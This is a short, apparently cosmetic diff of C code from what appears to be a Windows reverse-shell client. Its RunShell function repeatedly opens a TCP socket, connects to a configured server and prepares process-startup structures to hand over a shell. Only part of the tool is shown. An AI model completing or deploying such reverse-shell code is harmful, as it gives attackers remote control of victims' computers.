@@ -128,11 +128,9 @@ void EnableVirtualTerminalSequenceProcessing() {
 		printf("Could not enable virtual terminal processing");
 	}
 }*/
-
 BOOL RunShell(Arguments listAgrument) {
 	BOOL exitProcess = FALSE;
 	struct sockaddr_in sAddr;
-
 
 	char* ipAddress = (char*)calloc(IP_ADDRESS_SIZE, sizeof(char));
 	if (ipAddress == NULL)
@@ -161,7 +159,6 @@ BOOL RunShell(Arguments listAgrument) {
 	/*DWORD oldStdIn = 0, oldStdOut = 0, oldStdErr = 0;
 	InitConsole(oldStdIn, oldStdOut, oldStdErr);
 	EnableVirtualTerminalSequenceProcessing();*/
-
 	printMsg(STATUS_INFO, LEVEL_DEFAULT, "Try to connect to server\n");
 	while (!exitProcess) {
 		SOCKET mySocket = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (GROUP)0, (DWORD)0);
@@ -169,7 +166,6 @@ BOOL RunShell(Arguments listAgrument) {
 			if (connect(mySocket, (struct sockaddr*) &sAddr, sizeof(sAddr)) != SOCKET_ERROR) {
 				STARTUPINFOA StartupInfo;
 				PROCESS_INFORMATION ProcessInfo;
-
 				printMsg(STATUS_OK, LEVEL_DEFAULT, "Connected to %s:%i\n", ipAddress, listAgrument.port);
 				SendInitInfo(mySocket);
 
